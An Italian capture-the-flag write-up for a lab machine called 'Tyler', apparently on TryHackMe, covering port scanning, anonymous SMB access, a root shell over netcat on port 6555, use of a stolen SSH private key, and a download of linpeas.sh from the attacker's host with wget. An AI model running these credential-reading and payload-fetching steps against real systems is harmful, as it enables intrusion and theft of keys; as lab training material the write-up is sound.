# Tyler

## enum
partiamo con una enumerazione e scan dei serizi


```bash
nmap tyler.thm -sV -sC 
```
ed ecco spuntare a schermo la porta 445

coleghiamoci e vediamo cosa ci offre

## SMB

```bash
smbclient -L \\\\tyler.thm\\
```

guardiamo se collegandoci in anonimo in tutte e tre le directory abbiamo qualche hint
```bash
smbclient \\\\tyler.thm\\public
```

ecco la prima flag il file alert invece nulla di interessante. bene...cambiamo approccio

```bash
nmap tyler.thm -p-
```

ecco un altra porta 6555

## porta 6555

```bash
nc tyler.thm 6555
```
molto bene....abbiamo un accesso come root!!! entriamo nella cartella root ecco davanti a noi un altra flag

ma non abbiamo il file king.txt??

controlliamo meglio dall'ssh

```bash
cd /root/.ssh
cat id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+0qTaj8PluXd4pyYNMGPLbP2ZTwh4I8hVCNnkzaL7oXXbZolVtehOCawy+DOgnccIEHUqMgEvOEEs+2u/+UpWxL7t1QSnyLvMrMKAnLXBQDzr2uJx7Ljhli8wv7nIX83EcpzU7M2bViGGpXhxOAQa6Ud7pRVXekh71qZI22I7Zg/NPPSzsMbm0CQrJ9Q+J2kugu/EK4VQsR1COMs+7ssd0gkHQ8PooLHr1+x4Trf+DRb/H02hjl1TaZ589CixlQQNUfHzLjXnnuE7qslcX8c6Oe7sv7e808M87ZokdhrifWZrfwCxaZ54D6xWYdSScYzMKqLh0HQxO3KokicRgTJx tdurden@tyler
```

ecco la soluzione probabilmente il root di tdurden è separato dalla macchina main 

```bash
cd /root/.ssh
cat id_rsa
```
prendiamo l'id_rsa e colleghiamoci in ssh

ricordatevi di dare i giusti permessi all'id_rsa sulla vostra macchina 

quindi 
```bash
chmod 600 id_rsa
```
successivamente 

```bash
ssh tdurden@tyler.thm -i id_rsa
```
facciamo un controllo degli utenti 

```bash
cat /etc/passwd
```
ecco l'output andiamo ad analizzarlo
```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
narrator:x:1002:1002::/home/narrator:/bin/bash
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
nginx:x:997:994:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
librenms:x:996:993::/opt/librenms:/bin/bash

```

si siamo sulla macchina main facciamo il privesc

## Privesc
andiamo su una cartella dove possiamo caricare file e carichiamo il programma linpeas.sh (scaricatevelo prima!!)

```bash
sulla nostra macchina nella cartella dove è presente linpeas.sh facciamo: python -m http.server 80
sulla macchina tyler invece: wget http://indirizzoipnostro/linpeas.sh
```
ora diamo i permessi di avvio a linpeas.sh
```bash
chmod +x linpeas.sh
```
abbiamo trovato un vulnerabilità nel comando vim (controllate gtfo.bins ed è fatta)
